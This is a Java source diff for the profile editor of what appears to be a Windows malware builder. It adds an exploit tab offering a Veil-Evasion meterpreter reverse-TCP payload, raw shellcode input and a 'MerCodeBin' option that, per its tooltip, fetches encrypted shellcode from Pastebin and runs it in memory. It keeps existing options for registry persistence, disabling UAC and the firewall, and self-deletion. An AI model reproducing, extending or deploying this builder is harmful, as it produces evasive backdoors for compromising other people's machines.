@@ -6,6 +6,7 @@ import java.awt.event.ActionListener;
 import java.io.BufferedReader;
 import java.io.File;
 import java.io.FileNotFoundException;
+import java.io.FileOutputStream;
 import java.io.FileReader;
 import java.io.FileWriter;
 import java.io.IOException;
@@ -51,6 +52,13 @@ public class EditProfile extends JDialog {
 	private JCheckBox disablefirewall;
 	private JCheckBox addfirewallexception;
 	private JCheckBox melt;
+	private JPanel panel_4;
+	private JRadioButton VeilEvasion;
+	private JRadioButton MerCode;
+	private JRadioButton MerCodeBin;
+	private JPanel connectionPanel;
+	
+	private String SHELLCODE = null;
 	
 
 	/**
@@ -67,6 +75,7 @@ public class EditProfile extends JDialog {
         this.setLocationRelativeTo(null);       // Centramos la ventana en la pantalla
 	}
 	
+    private JLabel lblNoticeThisTab;
 	public EditProfile(java.awt.Frame parent, boolean model, Main recvMain, Profile profile){
         super(parent, model);
         MAIN = recvMain;      // RELLENAMOS VARIABLES GLOBALES
@@ -74,6 +83,20 @@ public class EditProfile extends JDialog {
         oldProfile = profile; // "
         runComponents();
         this.setLocationRelativeTo(null);       // Centramos la ventana en la pantalla
+        
+        switch(profile.EXPLOIT) {
+        	case "VEILEVASION":
+        		VeilEvasion.setSelected(true);
+        		break;
+        	case "MERCODE":
+        		SHELLCODE = profile.SHELLCODE;
+        		MerCode.setSelected(true);
+        		break;
+        	case "MERCODEBIN":
+        		SHELLCODE = profile.SHELLCODE;
+        		MerCodeBin.setSelected(true);
+        		break;
+        }
         
         // Rellenamos los JTextFields con los datos del perfil seleccionado
         name.setText(profile.NAME);
@@ -166,7 +189,7 @@ public class EditProfile extends JDialog {
 		getContentPane().setLayout(null);
 		{
 			JLabel lblNewLabel = new JLabel("Profile Name:");
-			lblNewLabel.setBounds(12, 13, 78, 16);
+			lblNewLabel.setBounds(12, 16, 78, 16);
 			getContentPane().add(lblNewLabel);
 		}
 		
@@ -184,13 +207,78 @@ public class EditProfile extends JDialog {
 		tabbedPane.setBounds(12, 49, 408, 415);
 		getContentPane().add(tabbedPane);
 		
-		JPanel panel = new JPanel();
-		tabbedPane.addTab("Connection", null, panel, null);
-		panel.setLayout(null);
+		panel_4 = new JPanel();
+		tabbedPane.addTab("Exploit", null, panel_4, null);
+		panel_4.setLayout(null);
+		
+		ButtonGroup ExploitBG = new ButtonGroup();
+		
+		VeilEvasion = new JRadioButton("[DEFAULT] Veil-Evasion's c/meterpreter/rev_tcp");
+		VeilEvasion.setToolTipText("The payload c/meterpreter/rev_tcp (deofuscated by JlXip)");
+		VeilEvasion.setSelected(true);
+		VeilEvasion.setBounds(8, 9, 387, 25);
+		ExploitBG.add(VeilEvasion);
+		panel_4.add(VeilEvasion);
+		
+		MerCodeBin = new JRadioButton("MerCodeBin");
+		MerCodeBin.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent e) {
+				if(SHELLCODE == null || SHELLCODE.equals("")) SHELLCODE = JOptionPane.showInputDialog(null, "Enter shellcode (\\x00)");
+				if(SHELLCODE == null || SHELLCODE.equals("")) {
+					VeilEvasion.setSelected(true);
+					return;
+				}
+				
+				File FPastebinAPIDevKey = new File("MerCodeBin.dat");
+				if(!FPastebinAPIDevKey.exists()) {
+					String PastebinAPIDevKey = JOptionPane.showInputDialog(null, "Enter your Pastebin API Dev Key");
+					if(PastebinAPIDevKey == null || PastebinAPIDevKey.equals("")) {
+						VeilEvasion.setSelected(true);						
+						return;
+					}
+					
+					try {
+						FileOutputStream fos = new FileOutputStream(FPastebinAPIDevKey);
+						
+						fos.write(PastebinAPIDevKey.getBytes());
+						
+						fos.close();
+					} catch(IOException ioe) {
+						// No debería de llamarse.
+					}
+				}
+			}
+		});
+		MerCodeBin.setToolTipText("JlXip's MerCodeBin Exploit: downloads a previously uploaded encrypted shellcode from Pastebin and executes it in memory.");
+		MerCodeBin.setBounds(8, 69, 387, 25);
+		ExploitBG.add(MerCodeBin);
+		panel_4.add(MerCodeBin);
+		
+		JLabel lblTooltipsWillOffer = new JLabel("Tooltips will offer more information about each exploit.");
+		lblTooltipsWillOffer.setBounds(8, 356, 383, 16);
+		panel_4.add(lblTooltipsWillOffer);
+		
+		MerCode = new JRadioButton("MerCode");
+		MerCode.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				if(SHELLCODE == null || SHELLCODE.equals("")) SHELLCODE = JOptionPane.showInputDialog(null, "Enter shellcode (\\x00)");
+				if(SHELLCODE == null || SHELLCODE.equals("")) {
+					VeilEvasion.setSelected(true);
+					return;
+				}
+			}
+		});
+		MerCode.setBounds(8, 39, 387, 25);
+		ExploitBG.add(MerCode);
+		panel_4.add(MerCode);
+		
+		connectionPanel = new JPanel();
+		tabbedPane.addTab("Connection", null, connectionPanel, null);
+		connectionPanel.setLayout(null);
 		
 		JLabel lblNewLabel_1 = new JLabel("IP/DNS:");
-		lblNewLabel_1.setBounds(12, 13, 45, 16);
-		panel.add(lblNewLabel_1);
+		lblNewLabel_1.setBounds(12, 16, 45, 16);
+		connectionPanel.add(lblNewLabel_1);
 		
 		ip = new JTextField();
 		ip.addActionListener(new ActionListener() {
@@ -199,12 +287,12 @@ public class EditProfile extends JDialog {
 			}
 		});
 		ip.setBounds(63, 10, 328, 28);
-		panel.add(ip);
+		connectionPanel.add(ip);
 		ip.setColumns(10);
 		
 		JLabel lblNewLabel_2 = new JLabel("PORT:");
-		lblNewLabel_2.setBounds(12, 46, 37, 16);
-		panel.add(lblNewLabel_2);
+		lblNewLabel_2.setBounds(12, 49, 37, 16);
+		connectionPanel.add(lblNewLabel_2);
 		
 		port = new JTextField();
 		port.addActionListener(new ActionListener() {
@@ -213,8 +301,12 @@ public class EditProfile extends JDialog {
 			}
 		});
 		port.setBounds(57, 43, 108, 28);
-		panel.add(port);
+		connectionPanel.add(port);
 		port.setColumns(10);
+		
+		lblNoticeThisTab = new JLabel("Notice: this tab is only needed when using Veil Evasion's exploit.");
+		lblNoticeThisTab.setBounds(12, 356, 379, 16);
+		connectionPanel.add(lblNoticeThisTab);
 		
 		JPanel panel_1 = new JPanel();
 		tabbedPane.addTab("Installation", null, panel_1, null);
@@ -230,7 +322,7 @@ public class EditProfile extends JDialog {
 		lblNewLabel_3.setBounds(12, 13, 91, 16);
 		panel_3.add(lblNewLabel_3);
 		
-		ButtonGroup bg = new ButtonGroup();
+		ButtonGroup PathBG = new ButtonGroup();
 		
 		temp = new JRadioButton("%TEMP%");
 		temp.addActionListener(new ActionListener() {
@@ -240,7 +332,7 @@ public class EditProfile extends JDialog {
 		});
 		temp.setSelected(true);
 		temp.setBounds(12, 38, 127, 25);
-		bg.add(temp);
+		PathBG.add(temp);
 		panel_3.add(temp);
 		
 		appdata = new JRadioButton("%APPDATA%");
@@ -250,7 +342,7 @@ public class EditProfile extends JDialog {
 			}
 		});
 		appdata.setBounds(12, 68, 127, 25);
-		bg.add(appdata);
+		PathBG.add(appdata);
 		panel_3.add(appdata);
 		
 		programfiles = new JRadioButton("%PROGRAMFILES%");
@@ -260,7 +352,7 @@ public class EditProfile extends JDialog {
 			}
 		});
 		programfiles.setBounds(12, 98, 143, 25);
-		bg.add(programfiles);
+		PathBG.add(programfiles);
 		panel_3.add(programfiles);
 		
 		manualenv = new JRadioButton("Manual environment var");
@@ -270,7 +362,7 @@ public class EditProfile extends JDialog {
 			}
 		});
 		manualenv.setBounds(12, 128, 167, 25);
-		bg.add(manualenv);
+		PathBG.add(manualenv);
 		panel_3.add(manualenv);
 		
 		manual = new JRadioButton("Manual");
@@ -279,8 +371,8 @@ public class EditProfile extends JDialog {
 				UpdateRadios();
 			}
 		});
-		manual.setBounds(12, 158, 69, 25);
-		bg.add(manual);
+		manual.setBounds(12, 164, 69, 25);
+		PathBG.add(manual);
 		panel_3.add(manual);
 		
 		additionalfolder = new JCheckBox("Additional folder");
@@ -294,7 +386,7 @@ public class EditProfile extends JDialog {
 			}
 		});
 		additionalfolder.setSelected(true);
-		additionalfolder.setBounds(12, 205, 121, 25);
+		additionalfolder.setBounds(12, 208, 121, 25);
 		panel_3.add(additionalfolder);
 		
 		manualenvTEXT = new JTextField();
@@ -317,7 +409,7 @@ public class EditProfile extends JDialog {
 		});
 		manualTEXT.setEnabled(false);
 		manualTEXT.setText("C:\\WINDOWS");
-		manualTEXT.setBounds(83, 162, 284, 28);
+		manualTEXT.setBounds(89, 162, 278, 28);
 		panel_3.add(manualTEXT);
 		manualTEXT.setColumns(10);
 		
@@ -333,7 +425,7 @@ public class EditProfile extends JDialog {
 		additionalfolderTEXT.setColumns(10);
 		
 		JLabel lblInstallationFolder = new JLabel("Installation file:");
-		lblInstallationFolder.setBounds(12, 275, 88, 16);
+		lblInstallationFolder.setBounds(12, 278, 88, 16);
 		panel_1.add(lblInstallationFolder);
 		
 		file = new JTextField();
@@ -355,7 +447,7 @@ public class EditProfile extends JDialog {
 		panel_2.setLayout(null);
 		
 		JLabel lblHkcu = new JLabel("HKCU:");
-		lblHkcu.setBounds(12, 13, 36, 16);
+		lblHkcu.setBounds(12, 16, 36, 16);
 		panel_2.add(lblHkcu);
 		
 		hkcu = new JTextField();
@@ -407,7 +499,7 @@ public class EditProfile extends JDialog {
 		        }
 			}
 		});
-		addfirewallexception.setBounds(12, 173, 157, 25);
+		addfirewallexception.setBounds(12, 176, 157, 25);
 		panel_2.add(addfirewallexception);
 		
 		exceptionname = new JTextField();
@@ -454,6 +546,12 @@ public class EditProfile extends JDialog {
 	public void Finish(){   // Método llamado por cada posible indicio de finalizar
         // Guardamos en variables los datos de los fields
         String NAME = name.getText();
+        
+        String EXPLOIT = "";
+        if(VeilEvasion.isSelected()) EXPLOIT = "VEILEVASION";
+        else if(MerCode.isSelected()) EXPLOIT = "MERCODE";
+        else if(MerCodeBin.isSelected()) EXPLOIT = "MERCODEBIN";
+        
         String IP = ip.getText();
         String PORT = port.getText();
         
@@ -512,11 +610,11 @@ public class EditProfile extends JDialog {
             JOptionPane.showMessageDialog(this, "You've to introduce a profile name!");
             return;
         }
-        if(IP.equals("")){
+        if(IP.equals("") && VeilEvasion.isSelected()){
             JOptionPane.showMessageDialog(this, "You've to introduce IP/DNS!");
             return;
         }
-        if(PORT.equals("")){
+        if(PORT.equals("") && VeilEvasion.isSelected()){
             JOptionPane.showMessageDialog(this, "You've to introduce a port!");
             return;
         }
@@ -552,11 +650,11 @@ public class EditProfile extends JDialog {
         } else {    // Si lo que estamos haciendo es crear un nuevo perfil...
             // ALMACENAR DATOS ACTUALES
             File oldFile = new File("profiles.dat");    // Abrimos archivo "profiles.dat"
-            if(!oldFile.exists()) {
+            if(!oldFile.exists() || !oldFile.isFile()) {
             	try {
             		oldFile.createNewFile();
             	} catch(IOException ioe) {
-            		ioe.printStackTrace();	// No debería de llamarase
+            		// No debería de llamarase
             	}
             }
             try{
@@ -578,7 +676,7 @@ public class EditProfile extends JDialog {
         }
         
         // GUARDAR NUEVOS DATOS
-        Profile profile = new Profile(NAME, IP, PORT, PATH, FILE, ADFOLDER, HKCU, HKLM, DISABLEUAC, DISABLEFIREWALL, ADDFIREWALL, MELT);  // Creamos un nuevo perfil con los datos
+        Profile profile = new Profile(NAME, EXPLOIT, IP, PORT, PATH, FILE, ADFOLDER, HKCU, HKLM, DISABLEUAC, DISABLEFIREWALL, ADDFIREWALL, MELT, SHELLCODE);  // Creamos un nuevo perfil con los datos
 
         try{
             File file = new File("profiles.dat");       // Abrimos el archivo "profiles.dat"
